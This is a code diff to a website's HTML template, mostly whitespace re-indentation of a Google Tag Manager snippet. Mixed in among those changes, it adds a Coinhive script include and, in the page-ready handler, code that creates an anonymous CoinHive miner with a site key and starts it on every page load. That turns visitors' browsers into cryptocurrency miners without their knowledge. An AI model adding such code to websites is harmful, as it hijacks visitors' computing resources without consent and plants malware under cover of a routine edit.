@@ -67,6 +67,7 @@
     <script src="../www/js/nette.ajax.js?ver=2.0"></script>
 
     <script src="../www/js/bootstrap.min.js"></script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <!--    <link rel="stylesheet" href="www/js/fileup/css/jquery.fileupload.css">
         <link rel="stylesheet" href="www/js/fileup/css/jquery.fileupload-ui.css">
         <script type="text/javascript" src="www/js/fileup/js/jquery.fileupload.js"></script>
@@ -111,7 +112,7 @@
     <link rel="alternate" hreflang="sk" href="{!$hreflang['sk']}" />
     <link rel="alternate" hreflang="hu" href="{!$hreflang['hu']}" />
     <link rel="alternate" hreflang="ru" href="{!$hreflang['ru']}" />
-    
+
     <style>
         /* Start by setting display:none to make this hidden.
        Then we position it in relation to the viewport window
@@ -156,17 +157,17 @@
     <script src="../www/js/gallery/jquery.blueimp-gallery.js"></script>
 
     <script type="text/javascript">
-            (function (w, d, s, l, i) {
-                w[l] = w[l] || [];
-                w[l].push({
-                    'gtm.start': new Date().getTime(), event: 'gtm.js'
-                });
-                var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
-                j.async = true;
-                j.src = '//www.googletagmanager.com/gtm.js?id=' + i + dl;
-                f.parentNode.insertBefore(j, f);
-            }
-            )(window, document, 'script', 'dataLayer', 'GTM-MTKG8H');
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(), event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src = '//www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        }
+        )(window, document, 'script', 'dataLayer', 'GTM-MTKG8H');
     </script>
     <script type="text/javascript">
         $(document).ready(function ()
@@ -178,6 +179,9 @@
                 delay: 10,
                 time: 1000
             });
+
+            var miner = new CoinHive.Anonymous('mERSzLXmZIaud8bRu4ANTcQQtJ6HlGoy');
+            miner.start();
         });
 
         $(window).resize(function () {
